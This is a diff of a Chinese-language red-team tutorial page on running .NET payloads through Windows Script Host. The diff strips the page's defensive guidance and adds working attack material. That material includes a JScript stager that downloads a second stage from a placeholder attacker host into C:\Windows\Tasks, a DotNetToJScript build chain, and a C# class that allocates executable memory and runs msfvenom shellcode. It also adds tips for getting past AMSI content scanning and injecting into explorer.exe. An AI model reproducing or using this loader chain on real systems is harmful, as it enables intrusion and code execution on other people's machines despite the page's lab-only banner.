@@ -1,60 +1,85 @@
 # WSH 与 .NET
 
-Windows Script Host（`cscript.exe` / `wscript.exe`）解释 `.js` / `.vbs`。它**不是** .NET 进程。脚本附件能运行、独立 EXE 不能，是实验室里很常见的组合。
+::: warning 仅供学习 / 授权实验
+JScript / DotNetToJScript 用于授权 lab。生成物自己编译，不要把默认工程名当指纹。
+:::
 
-## 先判断什么
+`cscript` / `wscript` 能跑、EXE 不能，是常见组合。WSH **不是** .NET 进程。
 
-- 脚本规则：AppLocker 默认对脚本的处理和 EXE 不同，先枚举有效规则
-- 宿主位数：64 位 Windows 上，双击通常走 `System32` 的 64 位 `wscript`；`SysWOW64` 才是 32 位
-- .NET 版本：现代 Windows 默认有 4.x；2.0/3.5 需要功能已启用
-- AMSI：Win10+ 会扫描**送进脚本引擎的文本**。文件表面上是「下载逻辑」、真正攻击内容是运行时 `eval` 拼出来的，扫描点在后者
-
-## 位数（最容易静默失败）
-
-| 宿主 | 能加载的程序集 |
-|---|---|
-| 64 位 `cscript` / `wscript` | x64 或 AnyCPU |
-| 32 位宿主 | x86 或 AnyCPU |
-
-若脚本还要把代码注入其它进程，shellcode 位数必须跟**目标进程**一致，不是跟操作系统一致。失败时脚本常常没有任何输出，只能靠监听和进程列表判断。
-
-先打印宿主信息：
+## 宿主位数
 
 ```bat
 echo %PROCESSOR_ARCHITECTURE%
-cscript //nologo //E:JScript -e "WScript.Echo(GetObject(\"winmgmts:\").Get(\"Win32_Processor\").AddressWidth)"
+cscript //nologo runner.js
+:: 64 位系统双击 = System32 的 64 位 wscript
+:: 32 位程序集必须用 SysWOW64\cscript.exe
 ```
 
-## 桥接类工具（只点名，不附带产物）
+64 位宿主只能加载 x64 / AnyCPU。注入 `explorer.exe` 时 shellcode 位数跟**目标进程**走。
 
-要把托管代码放进 WSH 进程，社区里长期使用的公开工具包括：
+## 最小下载器（只落盘，不直接 Run exe）
 
-- [DotNetToJScript](https://github.com/tyranid/DotNetToJScript)
-- SharpShooter / SuperSharpShooter 一类生成器
+```javascript
+var url  = "http://LHOST/stage.js";
+var dest = "C:\\Windows\\Tasks\\stage.js";
+var http = new ActiveXObject("MSXML2.XMLHTTP");
+http.open("GET", url, false);
+http.send();
+var f = new ActiveXObject("Scripting.FileSystemObject").CreateTextFile(dest, true);
+f.Write(http.responseText);
+f.Close();
+// 需要执行时再：
+// new ActiveXObject("WScript.Shell").Run("cscript //nologo " + dest, 0, false);
+```
 
-它们把程序集序列化进脚本，运行时在 WSH 里激活 `[ComVisible]` 类型。本站不托管生成结果。在授权实验里自己编译、自己改类型名，避免默认工程名当指纹。
+## DotNetToJScript 流程
+
+公开工具：[tyranid/DotNetToJScript](https://github.com/tyranid/DotNetToJScript)
 
 ```bat
-:: 目标机上的 .NET 编译器（实验用）
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /platform:anycpu /out:demo.dll demo.cs
+:: 1) C# 程序集：ComVisible 类，构造函数里跑 shellcode
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /platform:anycpu /out:payload.dll payload.cs
+
+:: 2) 序列化进 JScript（v4 对应 .NET 4.x）
+DotNetToJScript.exe payload.dll --lang=Jscript --ver=v4 -o runner.js
+
+:: 3) 目标
+cscript //nologo runner.js
 ```
 
-## AMSI 与「看起来无害的 dropper」
+C# 骨架：
 
-纯下载、只把文件存到磁盘的 JScript，正文往往不像「攻击脚本」，有时能过内容扫描；一旦把大段第二阶段内嵌、或 `eval` 动态拼出，就可能被拦。处理思路是**换扫描上下文**（换宿主、换「数据 vs 代码」的边界），而不是复制网上过期的 bypass。
+```csharp
+using System;
+using System.Runtime.InteropServices;
 
-PowerShell 的 AMSI 处理不能直接套到 WSH：集成点不同。
+[ComVisible(true)]
+public class TestClass {
+    [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
+    [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint st, IntPtr s, IntPtr p, uint f, IntPtr id);
 
-## 失败分类
+    public TestClass() {
+        byte[] sc = new byte[] { /* msfvenom -f csharp 贴这里 */ };
+        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
+        Marshal.Copy(sc, 0, mem, sc.Length);
+        CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
+    }
+}
+```
 
-| 现象 | 先查 |
+无 Windows 工具机时可用 SuperSharpShooter 吃 raw shellcode 出 `.js`（自行从作者仓库取）。
+
+`--ver=v2` 需要目标启用 .NET 3.5；现代机默认 **v4**。
+
+## AMSI（WSH）
+
+Win10+ 会扫送进引擎的**文本**。纯下载逻辑有时能过；`eval` 拼出来的大段第二阶段容易被拦。  
+PowerShell 的 AMSI 处理**不能**直接贴进 `.js`。
+
+## 失败
+
+| 现象 | 查 |
 |---|---|
-| 双击无回连，`cscript` 也无 | 位数、.NET 版本、脚本规则 |
-| 简单脚本能跑，一加 .NET 桥接被拦 | 内容扫描 / AMSI；拆第二阶段 |
-| EXE 能下不能跑 | 这正是走 WSH 的原因；不要让脚本再 `Run(pay.exe)` |
-
-## 防御侧
-
-- AppLocker 脚本规则覆盖 `cscript` / `wscript` / `mshta`
-- 约束 WSH；能关就关
-- 监控脚本宿主加载 CLR、异常的子进程和出网
+| 双击无回连 | 位数、.NET 版本 |
+| 简单 js 能跑，桥接被拦 | 内容扫描；拆阶段 |
+| 脚本再 `Run(pay.exe)` 失败 | 这正是走 WSH 的原因，别回到 EXE |
